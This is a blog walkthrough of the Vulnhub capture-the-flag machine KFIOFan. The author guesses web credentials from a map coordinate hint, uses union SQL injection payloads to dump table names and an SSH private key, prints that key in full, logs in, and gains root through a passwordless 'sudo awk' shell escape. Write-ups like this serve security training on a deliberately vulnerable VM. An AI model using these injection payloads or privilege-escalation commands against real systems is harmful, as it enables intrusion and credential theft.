---
layout:     post
title:      "Vulnhub.com - CTF KFIOFan"
date:       2018-12-05 0:00:00
author:     "W3ndige"
permalink: /:title/
category: Vulnhub
---

Two french people want to start the very first fanclub of the youtuber Khaos Farbauti Ibn Oblivion. But they're not very security aware! (IMPORTANT NOTE: The whole challenge is in french including server conf. Which may add to the difficulty if you are non-native or using a non-azerty keyboard)


* Author: [@khaos_farbauti](https://twitter.com/khaos_farbauti)
* Download: [https://www.vulnhub.com/entry/ctf-kfiofan-1,260/](https://www.vulnhub.com/entry/ctf-kfiofan-1,260/)

### Solution

From the start we can see what ports are open using `nmap`. 

{% highlight text %}
root@kali:~# nmap -sV -sC -sS -A 10.0.0.6
Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-04 13:29 EST
Nmap scan report for 10.0.0.6
Host is up (0.00059s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
| ssh-hostkey: 
|   2048 11:6a:2e:47:4e:d4:9d:0d:b2:ca:0f:12:1b:89:04:1c (RSA)
|   256 d2:00:b9:ea:48:fe:70:f2:6a:32:f7:be:ed:03:56:92 (ECDSA)
|_  256 96:43:4c:10:7a:8e:b1:9d:bb:49:0f:e6:d4:67:a5:41 (ED25519)
80/tcp open  http    Apache httpd
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=48.416667 -0.566667
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html; charset=iso-8859-1).
MAC Address: 08:00:27:D2:34:B7 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.59 ms 10.0.0.6

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.09 seconds
{% endhighlight %}

As the `http` port is open, we can start by viewing content of the website with `curl`. 

{% highlight text %}
root@kali:~# curl 10.0.0.6
Laisse moi deviner Bob, tu as encore perdu ton mot de passe ? LOL
{% endhighlight %}

It directly translates from French into this. 

{% highlight text %}
Translate from French: 
Let me guess Bob, did you lose your password again? LOL
{% endhighlight %}

But by actually going to the website with a web browser, we can see that the page is protected by `http authentication`. In the message box, we can see a message containing two numbers. 

{% highlight text %}
48.416667 -0.566667
{% endhighlight %}

After a moment, I've noticed that they look just like coordinates, and after putting them into the Google Maps, we get an address. 

{% highlight text %}
16 Rue du Château, 53300 Chantrigné, Francja
{% endhighlight %}

And after a little bit of time, the coombination of Bob:Chantrigné worked!

![Authenticated](/img/kfiofan/authenticated.png){:class="img-responsive center-block"}

I've decided to translate both of these posts but there weren't much clues essential for this moment. 

{% highlight text %}
"Hello everyone, here Khaos!" LOL No, it's Alice!

But Khaos is my idol, he is too great. I love her poems and unboxing videos with her daughter who is too cute <3
Bob says he's also doing let's play and something else with computers, but we do not care!


Alice: Fan NUMERO ONE of Khaos! I fell one day on an article about him in Madmoizelle and since then I am everything he does very closely! My favorite things are his poems and his music. My sister said it's bad, it's not music but noise. Fortunately I applied the advice of the great Khaos himself and since then I have more trouble with my sister. : D: D: D: D

Bob: Fan number 2 of Khaos. (Well that's what he says!) Well, he only discovered Khaos since he made videos and he only looks at the empty computer stuff (games and hacker stuff there) but that he knows enough to be allowed in the fan club. He annoys me to call him all the time "Cafio" but as he is cute I forgive him!
{% endhighlight %}


During usual enumaration of website, I've found first flag in `robots.txt` file. 

{% highlight text %}
FLAG 1 : Bravo tu as trouvÃ© le premier flag ! (Oui je sais tu espÃ©rais un indice mais au moins tu as les bons reflexes !)

FLAG 1: Congratulations you found the first flag! (Yes I know you're hoping for a clue but at least you have the right reflexes!)
{% endhighlight %}

In addition, I've found a search functionality in the website at ```http://10.0.0.6/khaosearch.php```. I decided to play with the input and found union sql injection. 

{% highlight sql %}
err" union select 1,2;#
{% endhighlight %}

But we need to get names of tables, and possibly columns from the database in order to find anything further. 

{% highlight sql %}
err" union select TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS;#
{% endhighlight %}

![SQL Injection](/img/kfiofan/sql-injection.png){:class="img-responsive center-block"}

As the results are parsed as links, by viewing the source code we can see what columns are exactly in each table. I decided to check `ssh_keys`, as it seems the most interesting. 

{% highlight html %}
<p><a href="user">ssh_keys</a></p>
<p><a href="privkey">ssh_keys</a></p>
{% endhighlight %}

Now we cen try to get the keys from that table. 

{% highlight sql %}
err" union select user, privkey FROM ssh_keys;#
{% endhighlight %}

And in the source, we have private key for user `alice`. 

{% highlight html %}
<p><a href="-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAnSCDYZ4E9BO/el3EybkhO2jG/lNW/uY0je648VSrJJGQ87tf
sb9eBUIriGhx+PNJuwvPSsct6N32HE/TzmJ98lcf6mMPlrjmYnNOFxgnuLaI2zbM
QV7msOgzLHONpgaU0gxgcIdiwbS8NuUeRwdxnN3H/QZycYzKbf0pJiM8qXL4/R4p
O7MMRn8OzBm361fwMc0DShvrb8kPoIvsC/qU6psAaEHk91Mot2qdSuC6hRIWca9r
TVUQK/hjQmxZ4yZb44LCv6ld8On3VWQgh7yluwZnzaVzKwG20X9P4cH/bYnFPsSV
7sulULft09QWHJJqCb4kHJR9DBVqCx1S3+9zCwIDAQABAoIBAHixFLnSyzNASAAS
LqpUTbZ4kQGhul0pLo0nJWAaDSuVtKXC84pw2CNp5E5vC7ySA7xtIdjqjdUlSXoN
xz/sX5naWmWLmdnIRQ6ySvVqVHiJnS3lNZew8bpJYaVvTQqOW5nMb/d/xtfLoBb6
fvtIOHip0ogEf7vAzW0W3Jiy0FHHDkboylsVE077xsV4gVcIkURv31UsXXlFZ8u+
2a+QQfJQDJX8a7pH0/hawehRGW0CJeW5D8+ROnZhWYY3BJF5Ls/KMPTMOY35O4a2
SpPzNm8UuTcvjTni+NnfYlzQFpjnlBlHmK32vL6hIb9ZI8J2TD4af9z53x/lrvpU
5wqTiUECgYEAzjr+qYf8zNct32YSPRaXwqvyB5QNSuIwMuqoaFclZfSNvW/f7cYx
CwliDW2D+IFMYUlsqxpqXgaRPjL+6ile1MmoKTd2XpTs8hemAe7RfXDLqGrlNx8R
QgbuTGljVkemvdXSAugf/bHKkKxzAQTkPqHm1SfooRnEd4X3imwVIakCgYEAwwvi
/wqigRO+WZnnd9KlU0WcT8xfnT/bX77oL4+Y/BgIWDJUvBsgNnR+ScBr0nsUEcDU
H/wSAYqqK8uqppWvMpjCscjRlu8v2MEUYct6mEJcjdBEP/xQ3KGY3T9HT73EXnKX
T8S/AZr94SDQhMU0aS5nDZSMTwff0Ap3sSTFh5MCgYB3ehYvgWkkA0XANxI58eza
C2OcoFlTGNdzqB8I0/QGrTewmC/TQQ8Ipdb4kIn0XnQxqKgcOKGG96cNsd2dK3qV
LH8P4eHhycW8O5chZ4pWchKK7+L7nDQTXJCSFDxIsBoZwNZ6eKCQCYChcEbwQDU7
U/C3bPeI3bTEyggvWY6kgQKBgQC3JRg252OD1Ggudmd0ieUXdgu6mmtFmsqA8x/O
WQYL4P0k483Q+5+ZwnU7B2W3ND66FNiaV/UIYY48pXdOCMuDtRFMIwc6tMm2vEZJ
NemdwuJpfyA2/NNo+IwzY9GwPL6A+RS/oDzCYyj1Ffz2Tr5R7XJyvAOryfcMwGd3
fNHF5QKBgEaR7tZN5+7barFT1nHTIGorwrLZfJod8l94DyC8v+K6zWxuUuQfq6xf
5hcUChoxK+RCH+YjRLRjVPkYsMH+/aROd5Tn9OGqlQlPq9ZLxBdPvnj5X1qgPyNa
BQYIHlH/RD1CYAfT8RDhXveC1qtjHJnq85fPrTCE6w8jk+ai/A/q
-----END RSA PRIVATE KEY-----
">alice</a></p>
{% endhighlight %}

With these credentials, we can `ssh` into the machine. 

{% highlight text %}
root@kali:~/vulnhub# ssh alice@10.0.0.6 -i key.txt 
Linux kfiofan 4.9.0-7-amd64 #1 SMP Debian 4.9.110-1 (2018-07-05) x86_64



          .__....._             _.....__,
            .": o :':         ;': o :".
            `. `-' .'.       .'. `-' .'
              `---'             `---'

    _...----...      ...   ...      ...----..._
 .-'__..-""'----    `.  `"`  .'    ----'""-..__`-.
'.-'   _.--"""'       `-._.-'       '"""--._   `-.`
'  .-"'                  :                  `"-.  `
  '   `.              _.'"'._              .'   `
        `.       ,.-'"       "'-.,       .'
          `.                           .'
            `-._                   _.-'
                `"'--...___...--'"`

TIC TAC TIC TAC TIC TAC TIC TAC TIC TAC TIC TAC TIC

Last login: Thu Aug  2 23:53:20 2018 from 192.168.1.28
alice@kfiofan:~$ cat flag3.txt 
FLAG 3 : Bravo pour être arrivé jusqu'ici. Cela montre que tu maitrises très bien les notions essentielles ! Un dernier petit effort et le root est à toi !
{% endhighlight %}

And here we have third flag for our collection. 

{% highlight text %}
FLAG 3: Congratulations for coming here. This shows that you master very well the essential concepts! One last little effort and the root is yours!
{% endhighlight %}

After enumaration I've found that `alice` can run `sudo awk` without password. We can easily spawn `bash` shell with that. 

{% highlight text %}
alice@kfiofan:~$ sudo -l
Entrées par défaut pour alice sur kfiofan :
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

L'utilisateur alice peut utiliser les commandes suivantes sur kfiofan :
    (root) NOPASSWD: /usr/bin/awk
{% endhighlight %}

One last step for `root`. 

{% highlight text %}
alice@kfiofan:~$ sudo awk 'BEGIN {system("/bin/bash")}'
root@kfiofan:/home/alice# cd /root
root@kfiofan:~# ls -la
total 52
drwx------  2 root root 4096 août   2 00:55 .
drwxr-xr-x 22 root root 4096 juil. 25 22:13 ..
-rw-r--r--  1 root root  570 janv. 31  2010 .bashrc
-rw-------  1 root root  200 août   1 16:59 flag4.txt
-rwx------  1 root root  423 juil. 27 15:05 genere_ssh_key.sh
-rwx------  1 root root  412 juil. 28 15:07 genere_web_pass.sh
-rw-------  1 root root 2700 août   2 00:47 .mysql_history
-rw-r--r--  1 root root  148 août  17  2015 .profile
-rw-r--r--  1 root root   74 juil. 26 15:19 .selected_editor
-rwx------  1 root root  291 juil. 28 15:49 timer_reboot.sh
-rw-------  1 root root 8099 juil. 26 14:17 ville.txt
-rw-r--r--  1 root root  218 juil. 26 16:30 .wget-hsts
root@kfiofan:~# cat flag4.txt 
FLAG 4 : TERMINE ! Un grand bravo à toi pour être arrivé jusqu'ici : la machine est à toi, sa survie ou sa destruction repose désormais entièrement sur ton éthique. Bonne continuation Hacker !
{% endhighlight %}

And translation. 

{% highlight text %}
FLAG 4: COMPLETE! Congratulations to you for coming here: the machine is yours, its survival or destruction is now entirely based on your ethics. Good luck Hacker!
{% endhighlight %}

Unfortunetly, at this moment I could not find second flag that was missing from the others, but I'll add an update once I have time to come back to this machine. 